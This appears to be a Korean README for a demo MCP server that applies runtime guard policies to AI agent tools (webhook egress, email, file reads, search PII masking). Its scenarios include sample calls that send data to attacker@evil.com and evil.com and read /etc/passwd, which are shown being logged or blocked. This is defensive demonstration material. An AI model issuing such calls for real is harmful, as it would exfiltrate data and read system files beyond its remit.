# Agent Runtime Security MCP 예제 서버

[English](./README.md) | [한국어](./README.ko.md)

Guard 정책이 적용된 MCP 서버 데모입니다. 4개 도구로 핵심 정책을 보여줍니다.

이 예제는 MCP 보호와 runtime policy rollout을 설명할 때 쓰는 TrapDefense 기본 데모 경로입니다.

## 도구

| 도구 | 데모 포인트 |
|------|------------|
| `post_webhook` | 외부 HTTP egress 차단 |
| `send_email` | 수신자 도메인 검사와 감사 증빙 |
| `read_file` | 파일 경로 제한 |
| `search` | 결과 PII 자동 마스킹 |

## 실행

```bash
# MCP Inspector로 실행
mcp dev examples/mcp_server.py

# 또는 직접 실행
python examples/mcp_server.py

# 고객 데모 리허설 스크립트
python examples/demo.py
```

## 데모 시나리오

### 1. Shadow 모드 (기본)

`policy.yaml`의 `mode: shadow` 상태에서 실행합니다.

```text
send_email(to="attacker@evil.com", subject="test", body="hello")
-> 실행 허용, audit에 original_action=warn 기록

read_file(path="/etc/passwd")
-> 실행 허용, audit에 original_action=block 기록

search(query="admin")
-> 결과의 PII가 마스킹됨 (shadow에서도 데이터 보호는 항상 강제)
```

### 2. Enforce 모드

`policy.yaml`에서 `mode: enforce`로 변경 후 재실행합니다.

```text
post_webhook(url="https://evil.com/hooks", body="hello")
-> 차단: "Tool 'post_webhook' blocked by policy 'domain_allowlist'"

post_webhook(url="https://internal.com/hooks", body="hello")
-> 허용 (allowlist 도메인)

send_email(to="attacker@evil.com", subject="test", body="hello")
-> 외부 수신자 도메인에 대한 warning 및 audit 증빙 남김

send_email(to="user@internal.com", subject="test", body="hello")
-> 허용 (allowlist 도메인)

read_file(path="/etc/passwd")
-> 차단: "Tool 'read_file' blocked by policy 'file_path_allowlist'"

read_file(path="/tmp/safe/data.txt")
-> 허용 (allowlist 경로)

search(query="admin")
-> 결과의 PII가 마스킹됨
```

## 정책 파일

`policy.yaml`을 수정하면 코드 변경 없이 정책을 바꿀 수 있습니다.

## LangChain / LangGraph 예제

Guard는 LangChain, LangGraph와도 연동됩니다.

```bash
# LangChain: guard_tool()로 개별 도구 보호
python examples/langchain_agent.py

# LangGraph: ToolNode 전체 보호
python examples/langgraph_agent.py
```

두 예제 모두 LLM 없이 실행 가능하며, allow/block/PII 마스킹 시나리오를 보여줍니다.

## 추천 데모 순서

1. 미팅 전에 `python examples/demo.py`로 shadow/enforce 동작을 먼저 확인합니다.
2. 라이브 데모에서는 `mcp dev examples/mcp_server.py`로 서버를 띄웁니다.
3. shadow 모드를 먼저 보여준 뒤 `policy.yaml`을 `mode: enforce`로 바꿔 재시작합니다.
4. 메인 데모는 `post_webhook`, `read_file`, `search` 순서로 진행하고, `send_email`은 수신자 도메인 예시로 보강합니다.
